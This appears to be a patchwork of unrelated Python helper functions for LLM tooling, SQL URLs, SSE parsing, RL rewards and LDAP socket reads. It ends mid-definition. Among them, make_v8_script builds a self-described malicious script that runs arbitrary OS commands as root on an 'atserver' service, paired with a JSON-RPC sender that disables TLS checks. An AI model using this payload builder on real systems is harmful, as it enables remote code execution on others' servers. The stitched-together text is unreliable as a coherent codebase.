from typing import Any


def build_viral_features(topic: dict[str, Any], creator_fit: dict[str, Any] | None = None, platform: str = "Bilibili") -> dict[str, float]:
    """Build normalized rule-based features for viral prediction."""
    creator_fit = creator_fit or {}
    title = str(topic.get("title", "")).lower()
    hook_strength = 0.45
    if any(token in title for token in ["ai", "agent", "open-source", "launch", "new", "tool", "trend"]):
        hook_strength += 0.25
    if any(token in title for token in ["how", "why", "3", "three", "best", "vs"]):
        hook_strength += 0.15
    return {
        "trend": float(topic.get("trend_score", 50)) / 100,
        "urgency": float(topic.get("urgency_score", 50)) / 100,
        "monetization": float(topic.get("monetization_score", 50)) / 100,
        "creator_fit": float(creator_fit.get("creator_fit_score", topic.get("audience_fit_score", 50))) / 100,
        "competition_inverse": max(0.0, 1 - float(topic.get("competition_score", 50)) / 100),
        "hook_strength": min(1.0, hook_strength),
        "platform_short_video_bonus": 1.0 if platform in ["Xiaohongshu", "YouTube Shorts", "TikTok"] else 0.75,
    }

from typing import Any


def jsonrpc_error(
    request_id: str | int | None, code: int, message: str, data: Any = None
) -> dict[str, Any]:
    """Build a JSON-RPC error response envelope."""
    error: dict[str, Any] = {"code": code, "message": message}
    if data is not None:
        error["data"] = data
    return {"jsonrpc": "2.0", "id": request_id, "error": error}

def _attach_reminder(out: list[dict], text: str) -> bool:
    """Fold an operator instruction into the adjacent user turn. True if it landed."""
    if out and out[-1].get("role") == "user":
        out[-1]["content"] = f"{out[-1]['content']}\n\n{text}".strip()
        return True
    return False

def convert_tools(tools) -> list[dict] | None:
    """Anthropic tool schemas -> the OpenAI ``function`` shape the chat templates render.

    Anthropic: ``{"name", "description", "input_schema"}`` (plus beta extras like ``strict``
    and ``defer_loading``, and server-tool entries carrying a ``type`` but no schema).
    We take the three fields we can render and drop the rest — an unknown extra field must
    never fail the request.
    """
    if not tools:
        return None
    out = []
    for t in tools:
        if not isinstance(t, dict) or not t.get("name"):
            continue
        fn = {"name": t["name"], "description": t.get("description") or ""}
        schema = t.get("input_schema")
        fn["parameters"] = schema if isinstance(schema, dict) else {"type": "object",
                                                                   "properties": {}}
        out.append({"type": "function", "function": fn})
    return out or None

def error_body(message: str, etype: str = "invalid_request_error") -> dict:
    """Anthropic's error envelope. Claude Code matches on the *wording* of upstream errors to
    decide whether it can recover (and forwards them unmodified through gateways for exactly
    that reason), so error text here is behaviour, not just diagnostics."""
    return {"type": "error", "error": {"type": etype, "message": message}}

import itertools


def _interp(curve: dict[int, float], x: int) -> float:
    """Piecewise-linear interpolation over the measured widths (extrapolates the last
    segment's slope above the top measured width)."""
    ks = sorted(curve)
    if x in curve:
        return curve[x]
    if x <= ks[0]:
        return curve[ks[0]]
    if x >= ks[-1]:
        if len(ks) == 1:
            return curve[ks[-1]]
        slope = (curve[ks[-1]] - curve[ks[-2]]) / (ks[-1] - ks[-2])
        return curve[ks[-1]] + slope * (x - ks[-1])
    for lo, hi in itertools.pairwise(ks):
        if lo < x < hi:
            f = (x - lo) / (hi - lo)
            return curve[lo] + f * (curve[hi] - curve[lo])
    return curve[ks[-1]]

def split_window_from_costs(cost: dict, max_chunk: int, *, min_kv: int = 4096,
                            margin: float = 0.05) -> dict | None:
    """Pure half of :func:`measure_split_window`: given single-call SDPA cost per q_len
    (``{q: seconds}``, q = 1..16) and the chunk size, return the split window or None.
    A width wins when the balanced split (predicted from the same sweep — conservative: the
    real split KV-slices earlier chunks) beats the single call by ``margin``; the window is
    the contiguous band of wins starting at ``max_chunk + 1``."""
    def split_cost(q):
        n = max(1, -(-q // max_chunk))        # ceil
        base, rem = divmod(q, n)
        sizes = [base + 1] * rem + [base] * (n - rem)
        return sum(cost[s] for s in sizes)

    top = max(cost)
    wins = [q for q in range(max_chunk + 1, top + 1)
            if q in cost and split_cost(q) < (1.0 - margin) * cost[q]]
    if not wins:
        return None
    # contiguous band from the first win (a stray win past a gap is noise, not a window)
    band = [wins[0]]
    for q in wins[1:]:
        if q == band[-1] + 1:
            band.append(q)
        else:
            break
    return {"min_q": band[0], "max_q": band[-1], "min_kv": min_kv, "max_chunk": max_chunk}

def _upstream_path(path: str) -> str | None:
    """Translate the app-scoped API into the sidecar API surface.

    Keeping this mapping explicit prevents the module from becoming an arbitrary
    HTTP proxy while still exposing the complete management workflow.
    """
    path = "/" + path.strip("/")
    if path == "/bridge-status":
        return None
    if path == "/status":
        return "/api/status"
    if path == "/health":
        return "/api/v1/health"
    if path == "/session":
        return "/api/icloud/session"
    if path == "/create-settings":
        return "/api/create-settings"
    if path == "/accounts" or path.startswith("/accounts/"):
        return "/api" + path
    if path == "/mailboxes" or path.startswith("/mailboxes/"):
        return "/api" + path
    if path.startswith(("/icloud/", "/apple-account/", "/runtime/", "/update/")):
        return "/api" + path
    return None

def _normalize_sql_url(dialect: str, url: str) -> str:
    """Rewrite SQL URLs to the async SQLAlchemy dialect form."""
    if not url or "://" not in url:
        return url
    if dialect == "mysql":
        if url.startswith("mysql://"):
            return f"mysql+aiomysql://{url[len('mysql://') :]}"
        if url.startswith("mariadb://"):
            return f"mysql+aiomysql://{url[len('mariadb://') :]}"
        if url.startswith("mariadb+aiomysql://"):
            return f"mysql+aiomysql://{url[len('mariadb+aiomysql://') :]}"
        return url
    if url.startswith("postgres://"):
        return f"postgresql+asyncpg://{url[len('postgres://') :]}"
    if url.startswith("postgresql://"):
        return f"postgresql+asyncpg://{url[len('postgresql://') :]}"
    if url.startswith("pgsql://"):
        return f"postgresql+asyncpg://{url[len('pgsql://') :]}"
    return url

from typing import Any


def extract_tool_names(tools: list[dict[str, Any]]) -> list[str]:
    """Return the list of function names from an OpenAI tools array."""
    names: list[str] = []
    for tool in tools:
        func = tool.get("function") or {}
        name = func.get("name", "").strip()
        if name:
            names.append(name)
    return names

def classify_line(line: str | bytes) -> tuple[str, str]:
    """Return (event_type, data) for a raw SSE line.

    event_type: 'data' | 'done' | 'skip'

    Handles both standard SSE ``data: {...}`` lines and raw JSON lines
    (upstream sometimes omits the ``data:`` prefix).
    """
    if isinstance(line, bytes):
        line = line.decode("utf-8", "replace")
    line = line.strip()
    if not line:
        return "skip", ""
    if line.startswith("data:"):
        data = line[5:].strip()
        if data == "[DONE]":
            return "done", ""
        return "data", data
    if line.startswith("event:"):
        return "skip", ""
    # Raw JSON line (no "data:" prefix) — treat as data.
    if line.startswith("{"):
        return "data", line
    return "skip", ""

from typing import Any


def extract_model_response_file_attachments(data: dict[str, Any]) -> list[str]:
    """Return fallback ``modelResponse.fileAttachments`` asset IDs."""
    result = data.get("result")
    if not isinstance(result, dict):
        return []
    response = result.get("response")
    if not isinstance(response, dict):
        return []
    model_response = response.get("modelResponse")
    if not isinstance(model_response, dict):
        return []
    attachments = model_response.get("fileAttachments")
    if not isinstance(attachments, list):
        return []
    return [attachment for attachment in attachments if isinstance(attachment, str) and attachment]

def state_distance(a, b) -> float:
    """Fraction of keys on which two artifact states differ, in ``[0, 1]``.

    Symmetric, and counts a key present in one and missing from the other as a
    difference -- a deletion moves the artifact as much as an edit does. Two
    empty states are at distance zero rather than raising.
    """
    keys = set(a) | set(b)
    if not keys:
        return 0.0
    return sum(1 for k in keys if a.get(k) != b.get(k)) / len(keys)

def pending_summary(state: dict) -> str:
    """Human-readable description of what's owed, for hook messages."""
    if state.get("debt_reps", 0) > 0:
        return f"{state['debt_reps']} {state['debt_exercise']}"
    return " or ".join(f"{o['reps']} {o['exercise']}" for o in state.get("debt_offers", []))

def day_counts(stats: dict, exercise: str | None = None) -> dict:
    """date -> reps. exercise=None gives the combined daily totals; a name
    gives that exercise's daily counts (only from when per-exercise tracking
    began)."""
    if exercise is None:
        return stats.get("by_day", {})
    return {d: exs.get(exercise, 0) for d, exs in stats.get("by_day_ex", {}).items()}

from typing import Any


def _strict_equal(left: Any, right: Any) -> bool:
    """Compare config values without Python's bool/integer equivalence."""

    if type(left) is not type(right):
        return False
    if isinstance(left, dict):
        return left.keys() == right.keys() and all(
            _strict_equal(left[key], right[key]) for key in left
        )
    if isinstance(left, list):
        return len(left) == len(right) and all(
            _strict_equal(left_item, right_item)
            for left_item, right_item in zip(left, right, strict=True)
        )
    return left == right

def flatten_overrides(table: dict) -> dict:
    """Normalize a parsed [prime_rl] table to flat dotted keys.

    Agents may write either quoted dotted keys ("trainer.optim.type" = "sgd")
    or nested tables ([prime_rl.trainer.optim]); both parse to the same thing.
    """
    flat: dict = {}

    def walk(node: dict, prefix: str) -> None:
        for key, value in node.items():
            dotted = f"{prefix}{key}"
            if isinstance(value, dict):
                walk(value, dotted + ".")
            else:
                flat[dotted] = value

    walk(table, "")
    return flat

def aggregate_gpu_samples(
    samples: list[tuple[float, int, float, float]],
    phases: list[tuple[str, float, float]],
) -> dict:
    """Per-GPU util/memory stats for the whole job and per phase."""

    def stats(rows: list[tuple[float, int, float, float]]) -> dict:
        out: dict = {}
        for gpu in sorted({r[1] for r in rows}):
            utils = [r[2] for r in rows if r[1] == gpu]
            mems = [r[3] for r in rows if r[1] == gpu]
            out[f"gpu{gpu}"] = {
                "util_mean": round(sum(utils) / len(utils), 1),
                "util_max": round(max(utils), 1),
                "mem_max_mib": round(max(mems)),
                "samples": len(utils),
            }
        return out

    if not samples:
        return {}
    report = {"overall": stats(samples)}
    for name, t0, t1 in phases:
        window = [r for r in samples if t0 <= r[0] <= t1]
        if window:
            report[name] = stats(window)
    return report

def efficiency_component(validated: bool, total_tokens: int, token_budget: int) -> float:
    """1.0 at zero tokens, linearly to 0.0 at the episode token budget.

    Only a *successful* episode earns efficiency credit — otherwise the cheapest
    strategy would be doing nothing.
    """
    if not validated or token_budget <= 0:
        return 0.0
    return max(0.0, min(1.0, 1.0 - total_tokens / token_budget))

def validation_component(validated: bool, attempts_used: int, max_attempts: int) -> float:
    """1.0 for a first-try pass, decaying linearly per failed attempt; 0.0 if never validated."""
    if not validated or attempts_used < 1:
        return 0.0
    return max(0.0, 1.0 - (attempts_used - 1) / max_attempts)

def _format_number(x: float) -> str:
    """Integers without a trailing .0; otherwise round to 2dp, strip trailing 0s."""
    if isinstance(x, int) or (isinstance(x, float) and x.is_integer()):
        return str(int(x))
    s = f"{round(float(x), 2):.2f}".rstrip("0").rstrip(".")
    return s

def _tool_call_name(tc) -> str:
    """Tool name across the wire shapes seen in rollouts: verifiers ToolCall
    objects expose .name directly; OpenAI-style dicts/objects nest it under
    .function.name. A detector reading only one shape silently scores 0.0 on
    the other — see tests/test_eval_reachability.py."""
    if isinstance(tc, dict):
        fn = tc.get("function") or {}
        name = fn.get("name", "") if isinstance(fn, dict) else getattr(fn, "name", "")
        return name or tc.get("name", "") or ""
    fn = getattr(tc, "function", None)
    if fn is not None:
        name = fn.get("name", "") if isinstance(fn, dict) else getattr(fn, "name", "")
        if name:
            return name
    return getattr(tc, "name", "") or ""

def string_op(op: str, text: str, arg: str = "") -> str:
    """Apply a character-level string operation and return the result.

    Operations:
      - "count": number of NON-overlapping occurrences of `arg` in `text`
        (Python str.count semantics). Returned as a decimal integer string.
      - "reverse": `text` with its characters reversed.
      - "upper": `text` upper-cased.
      - "first_n": the first `arg` characters of `text` (arg is an integer).
      - "last_n": the last `arg` characters of `text` (arg is an integer).
    Returns an error string on unknown ops or bad `arg`.

    Args:
        op: One of "count", "reverse", "upper", "first_n", "last_n".
        text: The input string to operate on.
        arg: Extra argument: the substring for "count", or the integer count for
            "first_n"/"last_n". Ignored by "reverse"/"upper".
    """
    o = str(op).strip().lower()
    t = "" if text is None else str(text)
    a = "" if arg is None else str(arg)
    if o == "count":
        if a == "":
            return "error: count requires a non-empty substring in arg"
        return str(t.count(a))
    if o == "reverse":
        return t[::-1]
    if o == "upper":
        return t.upper()
    if o in ("first_n", "last_n"):
        try:
            n = int(a)
        except Exception:
            return f"error: {o} requires an integer arg, got {arg!r}"
        if n < 0:
            return f"error: {o} requires a non-negative integer, got {n}"
        return t[:n] if o == "first_n" else (t[-n:] if n else "")
    return f"error: unknown op {op!r}"

def _one_op_transforms(word: str) -> set[str]:
    """Every string reachable from `word` with at most ONE tool op: identity,
    reverse, upper, and first_n/last_n for every k."""
    out = {word, word[::-1], word.upper()}
    for k in range(1, len(word) + 1):
        out.add(word[:k])
        out.add(word[-k:])
    return out

def _build_skill_prompt(skill_content: str) -> str:
    """Build the skill section to inject into the agent's system prompt."""
    if not skill_content or not skill_content.strip():
        return ""
    return (
        "\n\n## Skill Knowledge\n"
        "Below is a skill document with learned strategies. "
        "Use these guidelines to inform your decisions:\n\n"
        f"{skill_content}\n"
    )

import json


def _trace_field(row: dict) -> str:
    """Long trajectory dumps — wrap in <details> so Copilot doesn't waste tokens."""
    for k in ("trajectory", "trace", "turns", "messages"):
        v = row.get(k)
        if v in (None, ""):
            continue
        if isinstance(v, str):
            text = v
        else:
            text = json.dumps(v, indent=2, ensure_ascii=False)
        return text
    return ""

import re


def extract_answer(text: str) -> str:
    """Extract answer from <answer>...</answer> tags.

    Fallback: last non-empty line, then full response stripped.
    """
    matches = re.findall(r"<answer>(.*?)</answer>", text, re.DOTALL | re.IGNORECASE)
    if matches:
        return matches[-1].strip()
    lines = [ln.strip() for ln in text.strip().splitlines() if ln.strip()]
    if lines:
        return lines[-1]
    return text.strip()

def extract_code(text: str) -> str:
    """Extract the first ```python``` fenced code block from LLM output."""
    if "```" not in text:
        return text.strip()
    start = text.find("```")
    nl = text.find("\n", start)
    end = text.find("```", nl + 1)
    if nl == -1 or end == -1:
        return text.strip()
    return text[nl + 1 : end].strip()

from typing import Any


def _cast_value(val_str: str) -> Any:
    """Auto-cast a CLI string value to int / float / bool / str."""
    if val_str.lower() in ("true", "yes"):
        return True
    if val_str.lower() in ("false", "no"):
        return False
    try:
        return int(val_str)
    except ValueError:
        pass
    try:
        return float(val_str)
    except ValueError:
        pass
    return val_str

def recv_one_msg(sock):
    """Read one complete LDAPMessage (SEQUENCE) from the socket. Returns raw bytes or None."""
    hdr = b""
    while len(hdr) < 2:
        chunk = sock.recv(2 - len(hdr))
        if not chunk:
            return None
        hdr += chunk
    if hdr[0] != 0x30:
        return None
    l1 = hdr[1]
    idx = 2
    if l1 & 0x80:
        n = l1 & 0x7F
        ln_bytes = b""
        while len(ln_bytes) < n:
            chunk = sock.recv(n - len(ln_bytes))
            if not chunk:
                return None
            ln_bytes += chunk
        length = int.from_bytes(ln_bytes, "big")
        idx = 2 + n
    else:
        length = l1
    payload = b""
    while len(payload) < length:
        chunk = sock.recv(length - len(payload))
        if not chunk:
            break
        payload += chunk
    return hdr[:idx] + payload

def make_v8_script(marker_path, cmd=None):
    """Build the malicious V8 script (runcontext:owner, runs as the atserver
    process root privilege)."""
    if cmd:
        # Use ChildProcess to execute an OS command and write the result to
        # the marker
        code = '''var result = "START;";
try {
  var p = new ChildProcess(%r);
  p.execAsync({timeout: 5000});
  var out = p.stdOut || "";
  var fs = new FileSystem();
  fs.createFile(%r);
  var s = new OutputFileStream(%r, "binary");
  s.write("RCE_ROOT_OK_CALLER=[" + script.caller + "]_CMD_OUT=" + out);
  s.close();
  result += "EXEC_OK;";
} catch(e) { result += "ERR:" + e + ";"; }
return result;''' % (cmd, marker_path, marker_path)
    else:
        code = '''var result = "START;";
try {
  var fs = new FileSystem();
  fs.createFile(%r);
  var s = new OutputFileStream(%r, "binary");
  s.write("RCE_ROOT_OK_CALLER=[" + script.caller + "]_TS=" + Date.now());
  s.close();
  result += "FILE_WRITE_OK;";
} catch(e) { result += "FILE_ERR:" + e + ";"; }
return result;''' % (marker_path, marker_path)
    return '''<?xml version="1.0" encoding="UTF-8"?>
<script><metadata><owner>root</owner><runcontext>owner</runcontext><fireevent>0</fireevent></metadata>
<parameter name="request" type="http.request" trigger="false" relative="false" value=""/>
<code><![CDATA[%s]]></code></script>''' % code

def make_rpc(url, session, func, data=None, sid=-1, serverID=None):
    """Send a JSON-RPC request and return the response JSON."""
    payload = {"func": func, "data": data or {}, "queryID": 1, "session_id": sid}
    if serverID is not None:
        payload["serverID"] = serverID
    r = session.post(url, json=payload, verify=False, timeout=15)
    return r.json()

from typing import Any


def _chat_texts(messages: Any) -> list[str]:
    """Flatten LangChain's batched chat messages to their text contents."""
    texts: list[str] = []
    for batch in messages or []:
        for message in batch or []:
            content = getattr(message, "content", None)
            if isinstance(content, str):
                texts.append(content)
    return texts

from typing import Any


def _model_from_result(response: Any) -> str:
    """Pull the model name from a LangChain ``LLMResult``."""
    llm_output = getattr(response, "llm_output", None)
    if isinstance(llm_output, dict):
        model = llm_output.get("model_name") or llm_output.get("model")
        if model:
            return str(model)
    return ""

def parse_entry(text):
    """Read a distilled entry: source, questions, summary, rule, quote.

    distil.py checks its own output through this, so the writer and the reader
    can never drift into two spellings of the format.
    """
    entry = {"questions": []}
    for line in text.splitlines():
        if line.startswith("source:"):
            entry["source"] = line.split(":", 1)[1].strip()
        elif line.startswith("- "):
            entry["questions"].append(line[2:].strip())
        elif line.startswith("summary:"):
            entry["summary"] = line.split(":", 1)[1].strip()
        elif line.startswith("rule:"):
            entry["rule"] = line.split(":", 1)[1].strip()
        elif line.startswith("quote:"):
            entry["quote"] = line.split(":", 1)[1].strip().strip('"')
    return entry

import re


def sections(lines):
    """Split markdown lines into (heading, start, end) sections."""
    out = []
    heading, start = None, 0
    for i, line in enumerate(lines):
        if re.match(r"^#{1,3} ", line):
            if i > start or heading is not None:
                out.append((heading, start, i))
            heading, start = line.lstrip("# ").strip(), i
    out.append((heading, start, len(lines)))
    return [(h, s, e) for h, s, e in out if any(l.strip() for l in lines[s:e])]

def render(rel, entry):
